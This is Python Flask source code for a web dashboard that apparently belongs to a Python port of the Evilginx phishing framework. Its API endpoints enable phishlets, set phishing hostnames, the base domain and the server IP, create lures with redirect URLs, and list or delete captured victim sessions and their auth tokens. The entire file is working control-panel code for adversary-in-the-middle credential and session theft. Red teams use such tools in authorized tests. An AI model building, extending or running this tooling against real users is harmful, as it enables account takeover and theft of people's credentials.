#!/usr/bin/env python3
"""
Evilginx Python - Web Dashboard
Flask-based web interface for managing phishlets and sessions
"""

import os
import sys
import json
from flask import Flask, render_template, request, jsonify, redirect, url_for
from flask_cors import CORS

# Add parent directories to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from core.phishlet import Phishlet
from core.config import Config, Lure
from database.db import Database

app = Flask(__name__)
CORS(app)

# Global instances (will be initialized in main)
config = None
db = None
phishlets_dir = None


def init_app(cfg_dir: str, phish_dir: str, db_path: str):
    """Initialize the application with configuration"""
    global config, db, phishlets_dir
    
    phishlets_dir = phish_dir
    config = Config(cfg_dir)
    db = Database(db_path)
    
    # Load all phishlets
    load_phishlets()


def load_phishlets():
    """Load all phishlets from directory"""
    if not phishlets_dir or not os.path.exists(phishlets_dir):
        return
    
    for filename in os.listdir(phishlets_dir):
        if filename.endswith('.yaml'):
            site_name = filename.replace('.yaml', '')
            try:
                pl = Phishlet(site_name, config)
                pl.load_from_file(site_name, os.path.join(phishlets_dir, filename))
                config.add_phishlet(site_name, pl)
            except Exception as e:
                print(f"Error loading phishlet {filename}: {e}")


@app.route('/')
def index():
    """Dashboard home page"""
    return render_template('dashboard.html')


@app.route('/api/status')
def api_status():
    """Get system status"""
    return jsonify({
        'status': 'ok',
        'config_summary': config.get_config_summary() if config else {},
        'db_stats': db.get_stats() if db else {}
    })


@app.route('/api/phishlets')
def api_list_phishlets():
    """List all available phishlets"""
    phishlets = []
    for name, pl in config.phishlets.items():
        phishlets.append({
            'name': name,
            'author': pl.author,
            'version': str(pl.version),
            'enabled': config.is_site_enabled(name),
            'hidden': config.is_site_hidden(name),
            'hostname': config.site_domains.get(name, ''),
            'proxy_hosts_count': len(pl.proxy_hosts),
            'auth_tokens_count': sum(len(v) for v in pl.auth_tokens.values())
        })
    return jsonify(phishlets)


@app.route('/api/phishlets/<name>')
def api_get_phishlet(name):
    """Get details of a specific phishlet"""
    pl = config.get_phishlet(name)
    if not pl:
        return jsonify({'error': 'Phishlet not found'}), 404
    
    return jsonify({
        'name': pl.name,
        'author': pl.author,
        'version': str(pl.version),
        'proxy_hosts': [
            {
                'phish_sub': h.phish_subdomain,
                'orig_sub': h.orig_subdomain,
                'domain': h.domain,
                'session': h.handle_session,
                'is_landing': h.is_landing
            }
            for h in pl.proxy_hosts
        ],
        'auth_tokens': {
            domain: [t.name for t in tokens]
            for domain, tokens in pl.auth_tokens.items()
        },
        'login_domain': pl.login.domain,
        'login_path': pl.login.path
    })


@app.route('/api/phishlets/<name>/enable', methods=['POST'])
def api_enable_phishlet(name):
    """Enable a phishlet"""
    if config.set_site_enabled(name):
        return jsonify({'success': True})
    return jsonify({'success': False, 'error': 'Failed to enable phishlet'}), 400


@app.route('/api/phishlets/<name>/disable', methods=['POST'])
def api_disable_phishlet(name):
    """Disable a phishlet"""
    if config.set_site_disabled(name):
        return jsonify({'success': True})
    return jsonify({'success': False, 'error': 'Failed to disable phishlet'}), 400


@app.route('/api/phishlets/<name>/hostname', methods=['POST'])
def api_set_phishlet_hostname(name):
    """Set hostname for a phishlet"""
    data = request.get_json()
    domain = data.get('domain', '')
    if config.set_site_hostname(name, domain):
        return jsonify({'success': True})
    return jsonify({'success': False, 'error': 'Failed to set hostname'}), 400


@app.route('/api/config')
def api_get_config():
    """Get current configuration"""
    return jsonify(config.get_config_summary())


@app.route('/api/config/base-domain', methods=['POST'])
def api_set_base_domain():
    """Set base domain"""
    data = request.get_json()
    domain = data.get('domain', '')
    config.set_base_domain(domain)
    return jsonify({'success': True})


@app.route('/api/config/server-ip', methods=['POST'])
def api_set_server_ip():
    """Set server IP"""
    data = request.get_json()
    ip = data.get('ip', '')
    config.set_server_ip(ip)
    return jsonify({'success': True})


@app.route('/api/sessions')
def api_list_sessions():
    """List all sessions"""
    sessions = db.list_sessions()
    return jsonify([s.to_dict() for s in sessions])


@app.route('/api/sessions/<int:sid>')
def api_get_session(sid):
    """Get session by ID"""
    session = db.get_session_by_id(sid)
    if not session:
        return jsonify({'error': 'Session not found'}), 404
    return jsonify(session.to_dict())


@app.route('/api/sessions/<int:sid>', methods=['DELETE'])
def api_delete_session(sid):
    """Delete a session"""
    if db.delete_session_by_id(sid):
        return jsonify({'success': True})
    return jsonify({'success': False, 'error': 'Session not found'}), 404


@app.route('/api/sessions', methods=['DELETE'])
def api_delete_all_sessions():
    """Delete all sessions"""
    for session in db.list_sessions():
        db.delete_session_by_id(session.id)
    return jsonify({'success': True})


@app.route('/api/lures')
def api_list_lures():
    """List all lures"""
    lures = []
    for i, lure in enumerate(config.lures):
        lures.append({
            'index': i,
            **{k: v for k, v in lure.__dict__.items()}
        })
    return jsonify(lures)


@app.route('/api/lures', methods=['POST'])
def api_create_lure():
    """Create a new lure"""
    data = request.get_json()
    lure = Lure(
        hostname=data.get('hostname', ''),
        path=data.get('path', '/'),
        redirect_url=data.get('redirect_url', ''),
        phishlet=data.get('phishlet', ''),
        template=data.get('template', ''),
        info=data.get('info', '')
    )
    config.add_lure(lure.phishlet, lure)
    return jsonify({'success': True, 'index': len(config.lures) - 1})


@app.route('/api/lures/<int:index>', methods=['DELETE'])
def api_delete_lure(index):
    """Delete a lure"""
    if config.delete_lure(index):
        return jsonify({'success': True})
    return jsonify({'success': False, 'error': 'Lure not found'}), 404


if __name__ == '__main__':
    import argparse
    
    parser = argparse.ArgumentParser(description='Evilginx Python Web Dashboard')
    parser.add_argument('-c', '--config', default='./config', help='Configuration directory')
    parser.add_argument('-p', '--phishlets', default='./phishlets', help='Phishlets directory')
    parser.add_argument('-d', '--database', default='./data.db', help='Database file path')
    parser.add_argument('--host', default='0.0.0.0', help='Host to bind to')
    parser.add_argument('--port', type=int, default=5000, help='Port to bind to')
    parser.add_argument('--debug', action='store_true', help='Enable debug mode')
    
    args = parser.parse_args()
    
    # Initialize application
    init_app(args.config, args.phishlets, args.database)
    
    # Create templates directory if it doesn't exist
    templates_dir = os.path.join(os.path.dirname(__file__), 'templates')
    os.makedirs(templates_dir, exist_ok=True)
    
    print(f"Starting Evilginx Python Web Dashboard...")
    print(f"Configuration directory: {args.config}")
    print(f"Phishlets directory: {args.phishlets}")
    print(f"Database: {args.database}")
    print(f"Listening on {args.host}:{args.port}")
    print(f"Open http://{args.host}:{args.port} in your browser")
    
    app.run(host=args.host, port=args.port, debug=args.debug)
